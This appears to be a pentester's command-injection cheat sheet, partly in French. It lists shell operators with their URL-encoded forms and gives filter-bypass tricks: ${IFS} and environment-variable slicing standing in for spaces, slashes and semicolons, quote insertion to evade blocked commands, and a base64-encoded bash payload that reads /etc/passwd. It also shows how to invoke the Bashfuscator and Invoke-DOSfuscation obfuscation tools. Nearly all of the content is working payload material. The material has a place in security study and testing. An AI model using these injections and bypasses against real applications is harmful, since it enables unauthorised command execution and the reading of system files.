
| New Line   | `\n`   | `%0a`       | Both                                       |
| ---------- | ------ | ----------- | ------------------------------------------ |
| Background | `&`    | `%26`       | Both (second output generally shown first) |
| Pipe       | `\|`   | `%7c`       | Both (only second output is shown)         |
| AND        | `&&`   | `%26%26`    | Both (only if first succeeds)              |
| OR         | `\|`   | `%7c%7c`    | Second (only if first fails)               |
| Sub-Shell  | ` `` ` | `%60%60`    | Both (Linux-only)                          |
| Sub-Shell  | `$()`  | `%24%28%29` | Both (Linux-only)                          |

# Bypass

```
%09	: tabulation
${IFS} : équivaut à un espcae
{ls,-la} : bypass espace
${PATH:0:1} : équivaut à /
${LS_COLORS:10:1} : équivaut à ;
' ou " : contourne les commandes interdites
$@ ou \ : contourne les commandes interdites
%PROGRAMFILES:~10,-5% : correspond à un espace (cmd)
%HOMEPATH:~0,-17% : correspond à / (cmd)
$env:PROGRAMFILES[10] : correspond à un espace (powershell)
$env:HOMEPATH[0] : correspond à / (powershell)
```

```
echo -n 'cat /etc/passwd | grep 33' | base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
# Bashfuscator

```
./bashfuscator -c 'cat /etc/passwd'
```

# Dosfuscation

```
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```